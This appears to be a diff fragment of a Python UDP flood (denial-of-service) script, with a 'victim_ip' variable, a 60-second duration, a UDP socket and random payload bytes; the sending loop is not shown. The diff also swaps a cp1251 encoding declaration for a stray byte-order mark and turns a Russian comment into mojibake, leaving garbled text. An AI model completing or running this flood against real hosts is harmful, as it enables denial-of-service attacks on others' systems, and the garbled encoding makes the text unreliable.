@@ -1,11 +1,10 @@
-# -*- coding: cp1251 -*-
-import time
+п»їimport time
 import socket
 import random
 import sys
 
 victim_ip = '127.0.0.1'
-duration = 60 # в секундах
+duration = 60 # РІ СЃРµРєСѓРЅРґР°С…
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 msg = bytes(random.getrandbits(10))
